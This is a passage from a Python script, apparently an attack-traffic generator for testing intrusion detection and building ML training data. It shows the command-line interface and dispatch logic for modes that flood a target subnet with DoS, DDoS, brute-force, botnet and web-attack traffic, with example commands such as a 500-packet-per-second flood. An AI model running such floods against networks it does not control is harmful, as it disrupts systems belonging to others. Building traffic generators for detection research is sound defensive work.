  BRUTE_FORCE    - Authentication brute force attempts
  BOTNET         - Command & control communication patterns
  WEB_ATTACK     - Web application attacks (SQLi, XSS, etc.)

Examples:
  # Generate mixed traffic for 5 minutes at 100 pps
  sudo python3 advanced_attack_generator.py --mode mixed --duration 300 --rate 100
  
  # Generate only benign traffic for testing baseline
  sudo python3 advanced_attack_generator.py --mode benign --duration 600 --rate 50
  
  # Generate attack-only traffic for ML training
  sudo python3 advanced_attack_generator.py --mode attacks --duration 300 --rate 200
  
  # Generate DoS flood for specific testing
  sudo python3 advanced_attack_generator.py --mode flood --attack-type DoS --duration 120 --rate 500
        """
    )
    
    parser.add_argument("--interface", "-i", default="enp2s0", 
                       help="Network interface to use (default: enp2s0)")
    parser.add_argument("--target-network", "-t", default="192.168.1.0/24", 
                       help="Target network range (default: 192.168.1.0/24)")
    parser.add_argument("--mode", "-m", choices=['mixed', 'benign', 'attacks', 'flood'], default='mixed',
                       help="Traffic generation mode (default: mixed)")
    parser.add_argument("--attack-type", "-a", 
                       choices=['DoS', 'DDoS', 'RECONNAISSANCE', 'BRUTE_FORCE', 'BOTNET', 'WEB_ATTACK'],
                       help="Specific attack type for flood mode (required with --mode flood)")
    parser.add_argument("--duration", "-d", type=int, default=300, 
                       help="Duration in seconds (default: 300)")
    parser.add_argument("--rate", "-r", type=float, default=50.0, 
                       help="Packet rate in packets per second (default: 50.0)")
    parser.add_argument("--count", "-c", type=int, 
                       help="Number of packets to send (overrides duration)")
    parser.add_argument("--verbose", "-v", action="store_true", 
                       help="Enable verbose output")
    parser.add_argument("--dry-run", action="store_true", 
                       help="Show configuration without sending packets")
    
    args = parser.parse_args()
    
    # Validate arguments
    if args.mode == 'flood' and not args.attack_type:
        print(f"{Colors.RED}❌ --attack-type required when using --mode flood{Colors.END}")
        print("Valid attack types: DoS, DDoS, RECONNAISSANCE, BRUTE_FORCE, BOTNET, WEB_ATTACK")
        sys.exit(1)
    
    # Check for root privileges (skip in dry-run mode)
    if not args.dry_run and os.geteuid() != 0:
        print(f"{Colors.RED}❌ Root privileges required for packet injection{Colors.END}")
        print("Please run: sudo python3 advanced_attack_generator.py")
        print("Or use --dry-run to test configuration without sending packets")
        sys.exit(1)
    
    # Display configuration
    print(f"{Colors.BOLD}🚀 Advanced Attack Traffic Generator{Colors.END}")
    print(f"{Colors.CYAN}===================================={Colors.END}")
    print(f"Mode: {Colors.YELLOW}{args.mode.upper()}{Colors.END}")
    print(f"Interface: {args.interface}")
    print(f"Target Network: {args.target_network}")
    print(f"Duration: {args.duration} seconds")
    print(f"Rate: {args.rate} pps")
    if args.attack_type:
        print(f"Attack Type: {Colors.RED}{args.attack_type}{Colors.END}")
    if args.count:
        print(f"Packet Count: {args.count:,}")
    print()
    
    if args.dry_run:
        print(f"{Colors.YELLOW}🔍 DRY RUN MODE - No packets will be sent{Colors.END}")
        print("Configuration validated successfully!")
        return
    
    # Initialize generator
    generator = AdvancedAttackGenerator(args.interface, args.target_network)
    
    try:
        print(f"{Colors.GREEN}🎯 Starting traffic generation...{Colors.END}")
        print(f"Press Ctrl+C to stop gracefully")
        print()
        
        if args.mode == 'mixed':
            generator.generate_mixed_traffic(args.duration, args.rate)
            
        elif args.mode == 'benign':
            if args.count:
                generator.generate_benign_only_traffic(int(args.count / args.rate), args.rate)
            else:
                generator.generate_benign_only_traffic(args.duration, args.rate)
                
        elif args.mode == 'attacks':
            generator.generate_attack_only_traffic(args.duration, args.rate)
            
        elif args.mode == 'flood':
            generator.generate_attack_flood(args.attack_type, args.duration, args.rate)
    
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}⏹️ Traffic generation stopped by user{Colors.END}")
        generator.running = False
        
    except Exception as e:
        print(f"{Colors.RED}❌ Error during traffic generation: {e}{Colors.END}")
        if args.verbose:
            import traceback
            traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()
